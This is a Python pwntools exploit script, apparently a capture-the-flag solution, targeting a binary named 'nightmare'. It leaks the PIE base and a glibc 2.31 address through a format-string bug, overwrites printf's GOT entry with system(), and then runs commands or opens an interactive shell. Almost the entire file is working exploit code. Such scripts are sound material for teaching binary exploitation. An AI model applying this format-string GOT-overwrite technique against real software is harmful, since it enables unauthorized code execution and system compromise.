import pathlib

from pwn import *

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir/'nightmare'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)


def send_payload_scream(payload: bytes):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', payload)
    io.recvuntil(b'> ')
    return io.recvline().strip()


def send_payload_escape(payload: bytes):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', payload)
    io.recvuntil(b'> ')
    ret = io.recvline().strip()

    info('Payload length: %d', len(payload))
    if len(payload) >= 5:
        fix_input_bug()

    return ret


def fix_input_bug():
    io.sendlineafter(b'>', b'222')
    io.recvuntil(b'> ')
    io.recvuntil(b'> ')


def run_command(command: str):
    io.recvuntil(b'Exit\n')
    io.sendline(b'2')

    io.sendline(bytes(command, 'ascii'))


def get_command_output():
    return io.recvuntil(b'\nWrong code, buster')[:-21].decode('utf-8')


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = exploit_helper.start(exe=str(exe), gdb_script=gdb_script)

# Set up format string
format_string = FmtStr(execute_fmt=send_payload_scream, offset=5)
info('Format string offset: %d', format_string.offset)

# Leak PIE base
leaked_address = int(send_payload_escape('%{}$p'.format(9).encode('ascii')), 16)
info('Leaked address: %#x', leaked_address)

elf.address = leaked_address - 0x14d5
info('PIE base: %#x', elf.address)

# Leak Libc offset
start_main_ret_address = int(send_payload_escape('%{}$p'.format(13).encode('ascii')), 16)
info('Leaked libc_start_main_ret address: %#x', start_main_ret_address)

info(str(exploit_helper.get_symbol_offset('libc6_2.31-0ubuntu9_amd64',
                                          'system')))
libc_base_address = start_main_ret_address - exploit_helper.get_symbol_offset('libc6_2.31-0ubuntu9_amd64',
                                                                              '__libc_start_main_ret')
info('Leaked libc base address: %#x', libc_base_address)

system_address = libc_base_address + exploit_helper.get_symbol_offset('libc6_2.31-0ubuntu9_amd64', 'system')
info('Leaked system function address: %#x', system_address)

got_printf_address = elf.address + 0x3568
info('Leaked GOT printf address: %#x', got_printf_address)

format_string.write(got_printf_address, system_address)
format_string.execute_writes()

# Got Shell?
while True:
    cmd = input('Enter command to run: ')[:-1]
    if len(cmd) > 5:
        warn('Command too long, must be 5 characters or less!')
    else:
        if cmd == '':
            success("Exiting...")
            break

        run_command(cmd)

        if cmd in ['sh', 'zsh']:
            io.interactive()
            break
        else:
            success(get_command_output())
